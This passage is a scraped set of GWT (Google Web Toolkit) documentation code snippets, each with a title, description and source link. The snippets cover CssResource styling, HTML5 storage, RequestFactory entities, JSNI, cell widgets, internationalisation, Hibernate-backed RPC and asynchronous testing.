https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_31\n\nLANGUAGE: css\nCODE:\n```\n.a {background: blue;}\n.b {background: blue;}\n```\n\n----------------------------------------\n\nTITLE: Checking HTML5 Storage Support in GWT\nDESCRIPTION: Demonstrates how to check if the browser supports HTML5 storage before using it in a GWT application. This is important to ensure compatibility across different browsers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nStorage storage = Storage.getLocalStorageIfSupported();\nif (storage != null) {\n    // HTML5 local storage is supported\n    // Use storage object here\n} else {\n    // HTML5 local storage is not supported\n    // Implement fallback mechanism\n}\n```\n\n----------------------------------------\n\nTITLE: Associating a Locator with an EntityProxy in Java\nDESCRIPTION: This snippet demonstrates how to associate an EntityProxy interface with both its domain entity class and a custom locator using the @ProxyFor annotation. This allows RequestFactory to properly handle entity creation and persistence.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\n@ProxyFor(value = Employee.class, locator = EmployeeLocator.class)\n  public interface EmployeeProxy extends EntityProxy {\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Configuring LayoutPanel with Multiple Children in GWT\nDESCRIPTION: Demonstrates how to position multiple child widgets in a LayoutPanel using percentage and EM units for layout constraints.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiPanels.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nWidget child0, child1, child2;\nLayoutPanel p = new LayoutPanel();\np.add(child0); p.add(child1); p.add(child2);\n\np.setWidgetLeftWidth(child0, 0, PCT, 50, PCT);  // Left panel\np.setWidgetRightWidth(child1, 0, PCT, 50, PCT); // Right panel\n\np.setWidgetLeftRight(child2, 5, EM, 5, EM);     // Center panel\np.setWidgetTopBottom(child2, 5, EM, 5, EM);\n```\n\n----------------------------------------\n\nTITLE: Implementing a Task Entity in Java for RequestFactory\nDESCRIPTION: Example of a server-side Task entity class that can be used with RequestFactory. This class includes persistence annotations, field definitions, and getter methods that will be exposed via RequestFactory.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.mobilewebapp.server.domain;\n\n/**\n * A task used in the task list. \n */\n@Entity\npublic class Task {\n\n  @Id\n  Long id;\n\n  private Date dueDate;\n\n  @NotNull(message = \"You must specify a name\")\n  @Size(min = 3, message = \"Name must be at least 3 characters long\")\n  private String name;\n\n  private String notes;\n\n  /**\n   * The unique ID of the user who owns this task.\n   */\n  @Index\n  private String userId;\n\n  /**\n   * Get the due date of the Task.\n   */\n  public Date getDueDate() {\n    return dueDate;\n  }\n\n  /**\n   * Get the unique ID of the Task.\n   */\n  public Long getId() {\n    return id;\n  }\n\n  /**\n   * Get the name of the Task.\n   */\n  public String getName() {\n    return name;\n  }\n\n  /**\n   * Get the notes associated with the task.\n   */\n  public String getNotes() {\n    return notes;\n  }\n\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Customer Overlay Type Implementation in Java\nDESCRIPTION: Java class extending JavaScriptObject to create an overlay type for Customer data with native JSNI methods for accessing JSON properties.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsOverlay.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\n// An overlay type\nclass Customer extends JavaScriptObject {\n\n  // Overlay types always have protected, zero-arg ctors\n  protected Customer() { }\n\n  // Typically, methods on overlay types are JSNI\n  public final native String getFirstName() /*-{ return this.FirstName; }-*/;\n  public final native String getLastName()  /*-{ return this.LastName;  }-*/;\n\n  // Note, though, that methods aren't required to be JSNI\n  public final String getFullName() {\n    return getFirstName() + \" \" + getLastName();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Message Property Definition with Parameters (Properties)\nDESCRIPTION: Defines a simple message template with numbered parameters for internationalization\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nMessages.md#2025-04-09_snippet_0\n\nLANGUAGE: properties\nCODE:\n```\npermissionDenied = Error {0}: User {1} Permission denied.\n```\n\n----------------------------------------\n\nTITLE: Imported Scopes with Prefixes in CssResource\nDESCRIPTION: Demonstrates how to use @ImportedWithPrefix and @Import to handle multiple inheritance of interfaces with identical method signatures, allowing references to multiple unrelated CssResource types.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_36\n\nLANGUAGE: java\nCODE:\n```\n@ImportedWithPrefix(\"tree\")\ninterface TreeCss extends CssResource {\n  String widget();\n}\n\n@ImportedWithPrefix(\"checkbox\")\ninterface CbCss extends CssResource {\n  String widget();\n}\n\ninterface MyCss extends CssResource {\n  String other();\n}\n\ninterface Resources extends ClientBundle {\n  @Import({TreeCss.class, CbCss.class})\n  MyCss css();\n}\n```\n\nLANGUAGE: css\nCODE:\n```\n/* Now we can write a descendant selector using the prefixes defined on the CssResource types */\n.tree-widget .checkbox-widget {\n  color: red;\n}\n\n.other {\n  something: else;\n}\n```\n\n----------------------------------------\n\nTITLE: Accessing Fields and Methods with JSNI in Java\nDESCRIPTION: This snippet demonstrates how to access static and instance fields and methods from JSNI in a GWT project. It shows various ways to interact with Java code from within a native JavaScript method.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic class JSNIExample {\n\n  String myInstanceField;\n  static int myStaticField;\n\n  void instanceFoo(String s) {\n    // use s\n  }\n\n  static void staticFoo(String s) {\n    // use s\n  }\n\n  public native void bar(JSNIExample x, String s) /*-{\n    // Call instance method instanceFoo() on this\n    this.@com.google.gwt.examples.JSNIExample::instanceFoo(Ljava/lang/String;)(s);\n\n    // Call instance method instanceFoo() on x\n    x.@com.google.gwt.examples.JSNIExample::instanceFoo(Ljava/lang/String;)(s);\n\n    // Call static method staticFoo()\n    @com.google.gwt.examples.JSNIExample::staticFoo(Ljava/lang/String;)(s);\n\n    // Read instance field on this\n    var val = this.@com.google.gwt.examples.JSNIExample::myInstanceField;\n\n    // Write instance field on x\n    x.@com.google.gwt.examples.JSNIExample::myInstanceField = val + \" and stuff\";\n\n    // Read static field (no qualifier)\n    @com.google.gwt.examples.JSNIExample::myStaticField = val + \" and stuff\";\n  }-*/;\n\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Selection in GWT CellList\nDESCRIPTION: Example demonstrates how to implement a CellList with selection support using SingleSelectionModel. The code creates a list of weekdays with text cells and implements selection handling with keyboard support and event notifications.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Example of {@link CellList}. This example shows a list of the days of the week.\n */\npublic class CellListExample implements EntryPoint {\n\n  // The list of data to display.\n  private static final List<String> DAYS = Arrays.asList(\"Sunday\", \"Monday\",\n      \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\");\n\n  public void onModuleLoad() {\n    // Create a cell to render each value.\n    TextCell textCell = new TextCell();\n\n    // Create a CellList that uses the cell.\n    CellList<String> cellList = new CellList<String>(textCell);\n    cellList.setKeyboardSelectionPolicy(KeyboardSelectionPolicy.ENABLED);\n\n    // Add a selection model to handle user selection.\n    final SingleSelectionModel<String> selectionModel = new SingleSelectionModel<String>();\n    cellList.setSelectionModel(selectionModel);\n    selectionModel.addSelectionChangeHandler(new SelectionChangeEvent.Handler() {\n      public void onSelectionChange(SelectionChangeEvent event) {\n        String selected = selectionModel.getSelectedObject();\n        if (selected != null) {\n          Window.alert(\"You selected: \" + selected);\n        }\n      }\n    });\n\n    // Set the total row count. This isn't strictly necessary, but it affects\n    // paging calculations, so its good habit to keep the row count up to date.\n    cellList.setRowCount(DAYS.size(), true);\n\n    // Push the data into the widget.\n    cellList.setRowData(0, DAYS);\n\n    // Add it to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a ServiceLocator in Java\nDESCRIPTION: This snippet shows a simple implementation of the ServiceLocator interface that creates new instances of service classes using reflection. A ServiceLocator allows RequestFactory to invoke methods that return a Request type as instance methods instead of static methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\npublic class MyServiceLocator implements ServiceLocator {\n  @Override\n  public Object getInstance(Class<?> clazz) {\n    try {\n      return clazz.newInstance();\n    } catch (InstantiationException e) {\n      throw new RuntimeException(e);\n    } catch (IllegalAccessException e) {\n      throw new RuntimeException(e);\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing GWT Todo List Application\nDESCRIPTION: This class implements the EntryPoint interface for a GWT Todo List application. It imports necessary Polymer elements and starts the application by adding the main component to the root panel.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/elements-applogic.md#2025-04-09_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\npackage org.gwtproject.tutorial.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.vaadin.polymer.Polymer;\nimport com.vaadin.polymer.elemental.Function;\nimport com.vaadin.polymer.iron.element.IronIconElement;\nimport com.vaadin.polymer.paper.element.*;\n\nimport java.util.Arrays;\n\npublic class TodoList implements EntryPoint {\n\n    public void onModuleLoad() {\n        Polymer.importHref(Arrays.asList(\n                \"iron-icons/iron-icons.html\",\n                PaperIconItemElement.SRC,\n                PaperRippleElement.SRC,\n                IronIconElement.SRC,\n                PaperDrawerPanelElement.SRC,\n                PaperHeaderPanelElement.SRC,\n                PaperToolbarElement.SRC,\n                PaperFabElement.SRC,\n                PaperDialogElement.SRC,\n                PaperTextareaElement.SRC,\n                PaperInputElement.SRC,\n                PaperButtonElement.SRC,\n                PaperCheckboxElement.SRC\n        ), new Function() {\n            public Object call(Object arg) {\n                startApplication();\n                return null;\n            }\n        });\n\n    }\n\n    private void startApplication() {\n        RootPanel.get().add(new Main());\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Item UI Component with UiBinder XML\nDESCRIPTION: XML markup for the Item UI component using UiBinder. It defines the layout and styling for individual to-do items with a checkbox, title, and description.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_3\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n  xmlns:g='urn:import:com.google.gwt.user.client.ui'\n  xmlns:p='urn:import:com.vaadin.polymer.paper.widget'\n  xmlns:i='urn:import:com.vaadin.polymer.iron.widget'>\n  <ui:style>\n    @external .done;\n    .item .done {\n      text-decoration: line-through;\n    }\n    .title {\n      padding-left: 20px;\n      font-size: 150%;\n      font-weight: normal;\n    }\n  </ui:style>\n  <g:HTMLPanel\n    addStyleNames=\"vertical center-justified layout {style.item}\">\n    <style>\n    </style>\n    <div class=\"vertical-section\">\n      <h4>\n        <p:PaperCheckbox ui:field=\"done\"></p:PaperCheckbox>\n        <span ui:field=\"title\" class='{style.title}'>Go to Google</span>\n      </h4>\n      <div ui:field=\"description\" class='{style.description}'></div>\n    </div>\n  </g:HTMLPanel>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Browser-Specific CSS with CssResource\nDESCRIPTION: Shows how to implement browser-specific CSS styles using conditional statements based on the user agent. These conditions allow different styles to be applied for different browsers at compile time.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_40\n\nLANGUAGE: css\nCODE:\n```\n.foo {\n  background: green;\n}\n\n@if user.agent ie6 {\n  /* Rendering fix */\n  .foo {\n    position: relative;\n  }\n} @elif user.agent safari {\n  .foo {\n    \\-webkit-border-radius: 4px;\n  }\n} @else {\n  .foo {\n    font-size: x-large;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing RefreshWatchList Method in Java\nDESCRIPTION: Method implementation for refreshing stock watch list by making HTTP requests and handling responses.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\nprivate void refreshWatchList() {\n  if (stocks.size() == 0) {\n    return;\n  }\n\n  String url = JSON_URL;\n\n  Iterator<String> iter = stocks.iterator();\n  while (iter.hasNext()) {\n    url += iter.next();\n    if (iter.hasNext()) {\n      url += \"+\";\n    }\n  }\n\n  url = URL.encode(url);\n\n  RequestBuilder builder = new RequestBuilder(RequestBuilder.GET, url);\n  \n  try {\n    Request request = builder.sendRequest(null, new RequestCallback() {\n        public void onError(Request request, Throwable exception) {\n          displayError(\"Couldn't retrieve JSON\");\n        }\n  \n        public void onResponseReceived(Request request, Response response) {\n          if (200 == response.getStatusCode()) {\n            updateTable(JsonUtils.<JsArray<StockData>>safeEval(response.getText()));\n          } else {\n            displayError(\"Couldn't retrieve JSON (\" + response.getStatusText()\n                + \")\");\n          }\n        }\n    });\n  } catch (RequestException e) {\n    displayError(\"Couldn't retrieve JSON\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Offsets in Plural Forms (Java)\nDESCRIPTION: Example of using offsets in plural forms to handle cases like 'X, Y, and N others'. It demonstrates the use of @Offset annotation and array parameter for names.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nPluralForms.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyMessages extends Messages {\n  @DefaultMessage(\"{1}, {2} and {0} others are here.\")\n  @AlternateMessage({\n      \"=0\", \"Nobody is here.\",\n      \"=1\", \"{1} is  here.\",\n      \"=2\", \"{1} and {2} are here.\",\n      \"one\", \"{1}, {2}, and one other are here.\"\n  })\n  String peopleHere(@PluralCount @Offset(2) String[] names, String name1,\n      String name2);\n}\n```\n\n----------------------------------------\n\nTITLE: Using @ClassName for Non-Standard CSS Class Names\nDESCRIPTION: Demonstrates how to use the @ClassName annotation to map CSS class names that are not valid Java identifiers to method names in the CssResource interface.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_42\n\nLANGUAGE: java\nCODE:\n```\ninterface MyCss extends CssResource {\n  @ClassName(\"some-other-name\")\n  String someOtherName();\n}\n```\n\n----------------------------------------\n\nTITLE: Using i18nCreator Script for GWT Internationalization\nDESCRIPTION: Demonstrates how to use the i18nCreator script to generate the necessary files for internationalization in a GWT project. The script creates a properties file and launch configurations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18n.md#2025-04-09_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n$ i18nCreator -eclipse Foo com.example.foo.client.FooConstants\n  Created file src/com/example/foo/client/FooConstants.properties\n  Created file FooConstants-i18n.launch\n  Created file FooConstants-i18n\n```\n\n----------------------------------------\n\nTITLE: Complete StockWatcher UI Implementation in GWT\nDESCRIPTION: This code represents the complete implementation of the StockWatcher UI elements. It shows how to structure a GWT application with a FlexTable for stock data, panels for layout, and basic UI elements including a text input and button for adding stocks.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_10\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.HorizontalPanel;\nimport com.google.gwt.user.client.ui.Label;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\n\npublic class StockWatcher implements EntryPoint {\n\n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n\n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n\n    // Assemble Add Stock panel.\n    addPanel.add(newSymbolTextBox);\n    addPanel.add(addStockButton);\n\n    // Assemble Main panel.\n    mainPanel.add(stocksFlexTable);\n    mainPanel.add(addPanel);\n    mainPanel.add(lastUpdatedLabel);\n\n    // Associate the Main panel with the HTML host page.\n    RootPanel.get(\"stockList\").add(mainPanel);\n\n    // Move cursor focus to the input box.\n    newSymbolTextBox.setFocus(true);\n\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Reading Data from HTML5 Storage with GWT FlexTable\nDESCRIPTION: Shows how to iterate through storage contents and display data in a FlexTable UI component. Demonstrates key retrieval and item access methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideHtml5Storage.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.storage.client.Storage;\n\nprivate FlexTable stocksFlexTable = new FlexTable();\nprivate Storage stockstore = null;\n\nstockStore = Storage.getLocalStorageIfSupported();\nif (stockStore != null){\n  for (int i = 0; i < stockStore.getLength(); i++){\n    String key = stockStore.key(i);\n    stocksFlexTable.setText(i+1, 0, stockStore.getItem(key));\n    stocksFlexTable.setWidget(i+1, 2, new Label());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Person Editor Pattern in GWT\nDESCRIPTION: Demonstrates basic setup of a Person editor with POJO model, editor implementation, and workflow handling including initialization and save operations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiEditors.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n// Regular POJO, no special types needed\npublic class Person {\n  Address getAddress();\n  Person getManager();\n  String getName();\n  void setManager(Person manager);\n  void setName(String name);\n}\n \n// Sub-editors are retrieved from package-protected fields, usually initialized with UiBinder.\n// Many Editors have no interesting logic in them\npublic class PersonEditor extends Dialog implements Editor<Person> {\n  // Many GWT Widgets are already compatible with the Editor framework\n  Label nameEditor;\n  // Building Editors is usually just composition work\n  AddressEditor addressEditor;\n  ManagerSelector managerEditor;\n \n  public PersonEditor() {\n    // Instantiate my widgets, usually through UiBinder\n  }\n}\n \n// A simple demonstration of the overall wiring\npublic class EditPersonWorkflow{\n  // Empty interface declaration, similar to UiBinder\n  interface Driver extends SimpleBeanEditorDriver<Person, PersonEditor> {}\n \n  // Create the Driver\n  Driver driver = GWT.create(Driver.class);\n \n  void edit(Person p) {\n    // PersonEditor is a DialogBox that extends Editor<Person>\n    PersonEditor editor = new PersonEditor();\n    // Initialize the driver with the top-level editor\n    driver.initialize(editor);\n    // Copy the data in the object into the UI\n    driver.edit(p);\n     // Put the UI on the screen.\n    editor.center();\n  }\n \n  // Called by some UI action\n  void save() {\n    Person edited = driver.flush();\n    if (driver.hasErrors()) {\n      // A sub-editor reported errors\n    }\n    doSomethingWithEditedPerson(edited);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Prefetching in GWT Code Splitting\nDESCRIPTION: Shows how to implement code prefetching by using a nullable parameter in a runAsync call. When the parameter is null, the code is downloaded but not executed, preloading it for future use.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodeSplitting.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic void showContact(final String contactId) {\n  GWT.runAsync(new RunAsyncCallback() {\n      public void onFailure(Throwable caught) {\n        cb.onFailure(caught);\n      }\n\n      public void onSuccess() {\n        if (contactId == null) {\n          // do nothing: just a prefetch\n          return;\n        }\n\n        // Show contact contactId...\n      }\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Using Multiple Loggers in GWT\nDESCRIPTION: Demonstrates how to create multiple loggers with different hierarchies and use them in a GWT application.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nprivate static Logger childLogger = Logger.getLogger(\"ParentLogger.Child\");\nprivate static Logger parentLogger = Logger.getLogger(\"ParentLogger\");\nprivate static Logger rootLogger = Logger.getLogger(\"\");\n```\n\n----------------------------------------\n\nTITLE: Wrapping Leaflet Map Class with JsInterop\nDESCRIPTION: This snippet defines a wrapper for the Leaflet Map class using @JsType(isNative=true). It maps the setView method to allow interaction with Leaflet maps.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_11\n\nLANGUAGE: java\nCODE:\n```\n@JsType(isNative = true, namespace = \"L\")\npublic class Map {\n\n    public native L setView(double[] center, int zoom);\n}\n```\n\n----------------------------------------\n\nTITLE: Assembling UI Panels in GWT StockWatcher Application\nDESCRIPTION: Implementation of the onModuleLoad method that builds the complete UI structure. This code assembles the Add Stock panel (horizontal) with input box and button, then integrates it with other components in the Main panel (vertical).\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.Button;\nimport com.google.gwt.user.client.ui.FlexTable;\nimport com.google.gwt.user.client.ui.HorizontalPanel;\nimport com.google.gwt.user.client.ui.Label;\nimport com.google.gwt.user.client.ui.TextBox;\nimport com.google.gwt.user.client.ui.VerticalPanel;\n\npublic class StockWatcher implements EntryPoint {\n    \n  private VerticalPanel mainPanel = new VerticalPanel();\n  private FlexTable stocksFlexTable = new FlexTable();\n  private HorizontalPanel addPanel = new HorizontalPanel();\n  private TextBox newSymbolTextBox = new TextBox();\n  private Button addStockButton = new Button(\"Add\");\n  private Label lastUpdatedLabel = new Label();\n\n  /**\n   * Entry point method.\n   */\n  public void onModuleLoad() {\n    // Create table for stock data.\n    stocksFlexTable.setText(0, 0, \"Symbol\");\n    stocksFlexTable.setText(0, 1, \"Price\");\n    stocksFlexTable.setText(0, 2, \"Change\");\n    stocksFlexTable.setText(0, 3, \"Remove\");\n\n    // Assemble Add Stock panel.\n    addPanel.add(newSymbolTextBox);\n    addPanel.add(addStockButton);\n\n    // Assemble Main panel.\n    mainPanel.add(stocksFlexTable);\n    mainPanel.add(addPanel);\n    mainPanel.add(lastUpdatedLabel);\n    \n    // TODO Associate the Main panel with the HTML host page.\n    // TODO Move cursor focus to the input box.\n    \n  }\n    \n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GWT RPC Service with Hibernate in Java\nDESCRIPTION: Implements the MusicStoreService interface using Hibernate sessions to perform database operations. Uses HibernateUtil for session management.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic class MusicStoreServiceImpl extends RemoteServiceServlet implements\nMusicStoreService {\n\n  @Override\n  public List<Account> getAccounts() {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    List<Account> accounts = new ArrayList<Account>(session.createQuery(\"from Account\").list());\n    session.getTransaction().commit();\n    return accounts;\n  }\n\n  @Override\n  public List<Record> getRecords() {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    List<Record> records = new ArrayList<Record>(session.createQuery(\"from Record\").list());\n    session.getTransaction().commit();\n    return records;\n  }\n\n  @Override\n  public Long saveAccount(Account account) {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    session.save(account);\n    session.getTransaction().commit();\n    return account.getId();\n  }\n\n  @Override\n  public Long saveRecord(Record record) {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    session.save(record);\n    session.getTransaction().commit();\n    return record.getId();\n  }\n\n  @Override\n  public void saveRecordToAccount(Account account, Record record) {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    account = (Account) session.load(Account.class, account.getId());\n    record = (Record) session.load(Record.class, record.getId());\n    account.addRecord(record);\n    session.save(account);\n    session.getTransaction().commit();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating 9-Box CSS Styling with Dynamic Image Dimensions\nDESCRIPTION: CSS implementation for a 9-box layout that uses the value() function to dynamically insert image dimensions. This allows for proper padding and positioning based on the actual dimensions of the border images.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_47\n\nLANGUAGE: css\nCODE:\n```\n.contentArea {\n  padding: value('topBorder.getHeight', 'px') value('rightBorder.getWidth', 'px')\n      value('bottomBorder.getHeight', 'px') value('leftBorder.getWidth', 'px');\n}\n\n@sprite .contentAreaTopLeftBorder {\n  gwt-image: 'topLeftBorder';\n  position: absolute;\n  top:0;\n  left: 0;\n}\n\n@sprite .contentAreaTopBorder {\n  gwt-image: 'topBorder';\n  position: absolute;\n  top: 0;\n  left: value('topLeftBorder.getWidth', 'px');\n  right: value('topRightBorder.getWidth', 'px');\n}\n\n@sprite .contentAreaTopRightBorder {\n  gwt-image: 'topRightBorder';\n  position: absolute;\n  top:0;\n  right: 0;\n}\n\n@sprite .contentAreaBottomLeftBorder {\n  gwt-image: 'bottomLeftBorder';\n  position: absolute;\n  bottom: 0;\n  left: 0;\n}\n\n@sprite .contentAreaBottomBorder {\n  gwt-image: 'bottomBorder';\n  position: absolute;\n  bottom: 0;\n  left: value('bottomLeftBorder.getWidth', 'px');\n  right: value('bottomRightBorder.getWidth', 'px');\n}\n\n@sprite .contentAreaBottomRightBorder {\n  gwt-image: 'bottomRightBorder';\n  position: absolute;\n  bottom: 0;\n  right: 0;\n}\n\n@sprite .contentAreaLeftBorder {\n  gwt-image: 'leftBorder';\n  position: absolute;\n  top: 0;\n  left: 0;\n  height: 100%;\n}\n\n@sprite .contentAreaRightBorder {\n  gwt-image: 'rightBorder';\n  position: absolute;\n  top: 0;\n  right: 0;\n  height: 100%;\n}\n```\n\n----------------------------------------\n\nTITLE: Adding SimplePager to a GWT CellList\nDESCRIPTION: This example shows how to add a SimplePager control to a CellList. It creates a ListDataProvider with sample data, initializes a SimplePager instance, and connects it to the CellList for pagination functionality.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\n/**\n * Example of {@link SimplePager}.\n */\npublic class SimplePagerExample implements EntryPoint {\n\n  public void onModuleLoad() {\n    // Create a CellList.\n    CellList<String> cellList = new CellList<String>(new TextCell());\n\n    // Add a cellList to a data provider.\n    ListDataProvider<String> dataProvider = new ListDataProvider<String>();\n    List<String> data = dataProvider.getList();\n    for (int i = 0; i < 200; i++) {\n      data.add(\"Item \" + i);\n    }\n    dataProvider.addDataDisplay(cellList);\n\n    // Create a SimplePager.\n    SimplePager pager = new SimplePager();\n\n    // Set the cellList as the display.\n    pager.setDisplay(cellList);\n\n    // Add the pager and list to the page.\n    VerticalPanel vPanel = new VerticalPanel();\n    vPanel.add(pager);\n    vPanel.add(cellList);\n    RootPanel.get().add(vPanel);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding Utility Methods to Native Types with @JsOverlay\nDESCRIPTION: This snippet demonstrates how to add Java-only utility methods to native JavaScript types using @JsOverlay annotation. These methods won't be accessible from JavaScript.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJsInterop.md#2025-04-09_snippet_9\n\nLANGUAGE: java\nCODE:\n```\n@JsType(isNative = true)\npublic class FancyWidget {\n\n    public boolean visible;\n\n    public native boolean isVisible();\n\n    public native void setVisible(boolean visible);\n\n    @JsOverlay\n    public final void toggle() {\n        visible = !visible;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Asynchronous GWT Tests with Timer\nDESCRIPTION: Demonstrates how to write asynchronous tests in GWT using Timer, delayTestFinish(), and finishTest() methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideTesting.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npublic void testTimer() {\n  // Setup an asynchronous event handler.\n  Timer timer = new Timer() {\n    public void run() {\n      // do some validation logic\n\n      // tell the test system the test is now done\n      finishTest();\n    }\n  };\n\n  // Set a delay period significantly longer than the\n  // event is expected to take.\n  delayTestFinish(500);\n\n  // Schedule the event and return control to the test system.\n  